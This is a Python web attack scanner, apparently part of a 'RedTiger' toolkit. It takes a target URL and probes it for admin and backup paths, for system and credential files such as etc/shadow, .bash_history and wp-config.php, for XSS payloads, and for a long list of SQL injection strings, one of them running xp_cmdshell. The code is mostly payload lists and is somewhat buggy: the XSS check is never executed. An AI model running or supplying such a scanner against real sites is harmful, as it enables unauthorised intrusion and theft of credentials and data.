import requests

try:
    def TestPaths(paths, url):
        if not str(url).endswith('/'):
            url += '/'
        try:
            for path in paths:
                test_url = url + path
                try:
                    responde = requests.get(test_url, timeout=10)
                    if responde.status_code == 200:
                        print(f"[!] Possible sensitive path found: {test_url}")
                except requests.RequestException:
                    continue
        except Exception as e:
            print(f"Error testing paths: {e}")

    def TestPayload(payloads, indicators, url):
        if not str(url).endswith('/'):
            url += '/'
        try:
            for payload in payloads:
                test_url = url + payload
                try:
                    responde = requests.get(test_url, timeout=10)
                    if responde.status_code == 200:
                        for indicator in indicators:
                            if indicator in responde.text:
                                print(f"[!] Possible SQL Injection found: {test_url}")
                                break

                except requests.RequestException:
                    continue
        except Exception as e:
            print(f"Error testing payloads: {e}")

    def PossiblePaths(url):
        paths = [
            "admin", "admin/", "admin/index.php", "admin/login.php", "admin/config.php",
            "backup", "backup/", "backup/db.sql", "backup/config.tar.gz", "backup/backup.sql",
            "private", "private/", "private/.env", "private/config.php", "private/secret.txt",
            "uploads", "uploads/", "uploads/file.txt", "uploads/image.jpg", "uploads/backup.zip",
            "api", "api/", "api/v1/", "api/v1/users", "api/v1/status",
            "logs", "logs/", "logs/error.log", "logs/access.log", "logs/debug.log",
            "cache", "cache/", "cache/temp/", "cache/session/", "cache/data/",
            "server-status", "server-status/", "server-status/index.html",
            "dashboard", "dashboard/", "dashboard/index.html", "dashboard/admin.php", "dashboard/settings.php"
        ]
        TestPaths(paths, url) 

    def SensitiveFiles(url):
        files = [
            "etc/passwd", "etc/password", "etc/shadow", "etc/group", "etc/hosts", "etc/hostname",
            "var/log/auth.log", "var/log/syslog", "var/log/messages", "var/log/nginx/access.log",
            "root/.bash_history", "home/user/.bash_history", "www/html/wp-config.php", "proc/self/environ",
            "opt/lampp/phpmyadmin/config.inc.php", "boot/grub/menu.lst", "proc/net/tcp"
        ]
        TestPaths(files, url)

    def Xxs(url):
        payloads = [
            "<script>alert('XssFoundByRedTiger')</script>",
            "<img src=x onerror=alert('XssFoundByRedTiger')>",
            "<svg/onload=alert('XssFoundByRedTiger')>"
        ]
        indicators = ["<script>", "alert(", "onerror=", "<svg", "javascript:"]
    def Sql(url):
        payloads = [
            "'", '"', "''", "' OR '1'='1'", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1 --", "/1000",
            "' OR 1=1 /*", "' OR 'a'='a", "' OR 'a'='a' --", "' OR 'a'='a' /*", "' OR ''='", "admin'--", "admin' /*",
            "' OR 1=1#", "' OR '1'='1' (", "') OR ('1'='1", "'; EXEC xp_cmdshell('dir'); --", "' UNION SELECT NULL, NULL, NULL --", 
            "' OR 1=1 --", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR 1=1#", "' OR 1=1/*", 
            "' OR 'a'='a'#", "' OR 'a'='a'/*", "' OR ''=''", "' OR '1'='1'--", "admin' --", "admin' #", "' OR 1=1--", "' OR 1=1/*", 
            "' OR 'a'='a'--", "' OR ''=''", "' OR 'x'='x'", "' OR 'x'='x'--", "' OR 'x'='x'/*", "' OR 1=1#", "' OR 1=1--", 
            "' OR 1=1/*", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*"
        ]
        indicators =  [
            "SQL syntax", "SQL error", "MySQL", "mysql", "MySQLYou",
            "Unclosed quotation mark", "SQLSTATE", "syntax error", "ORA-", 
            "SQLite", "PostgreSQL", "Truncated incorrect", "Division by zero",
            "You have an error in your SQL syntax", "Incorrect syntax near", 
            "SQL command not properly ended", "sql", "Sql", "Warning", "Error"
        ]
        TestPayload(payloads, indicators, url)

    url = input("Enter the target URL: ").strip()
    PossiblePaths(url)
    SensitiveFiles(url)
    Xxs(url)
    Sql(url)

except Exception as e:
    input(e)
